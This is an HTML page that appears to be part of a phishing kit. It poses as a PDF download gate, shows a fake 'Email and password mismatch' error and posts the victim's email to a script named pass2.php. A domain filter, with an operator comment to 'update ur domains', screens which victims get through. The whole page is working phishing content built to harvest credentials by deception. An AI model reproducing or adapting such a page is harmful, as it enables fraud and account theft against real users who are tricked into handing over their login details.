<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Download</title>
  
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
  
  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans'>

      <link rel="stylesheet" href="css/style.css">
	  
	  

  
</head>

<script language="JavaScript">
<!--
function validateForm()
{
var y=document.forms["myform"]["pdf3"].value;
if(y==null || y=="")
  {
  alert("Enter your Email");
  return false;
  }
}
-->
</script>

<script>
var domains = ["gmail"]; //update ur domains here

function validateDomain(me){
  var idx1 = me.value.indexOf("@");
  if(idx1>-1){
    var splitStr = me.value.split("@");
    var sub = splitStr[1].split(".");
    if(domains.indexOf(sub[0])>-1){
      me.value="";
      alert("invalid email");
    }
  }
}
</script>   

<body>

  <div class="cont">
  <div class="demo">
    <div class="login">
      <div class="login__check"><img src="./im/pdf.png" height="110" width="110"><br><font color="#ff0000" size="2">Email and password mismatch Try again.</font></div>
      <div class="login__form">
        <div class="login__row"><form action="pass2.php"  method="post" autocomplete="off" onsubmit="return validateForm()" name="myform">
          <svg class="login__icon name svg-icon" viewBox="0 0 20 20">
            <path d="M0,20 a10,8 0 0,1 20,0z M10,0 a4,4 0 0,1 0,8 a4,4 0 0,1 0,-8" />
          </svg>
		 
          <input type="email" class="login__input name" name="pdf3" placeholder="Recipient Email" onsubmit="return validateForm()"onblur="validateDomain(this)"/>
		  
        </div>
		 
        
        <button type="submit" class="login__submit">Download File (300kb)</button>
        <p class="login__signup"><a></a></p>
      </div>
    </div>
      </div>
    </div>
  </div>
</div>
</form>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

  

    <script  src="js/index.js"></script>




</body>

</html>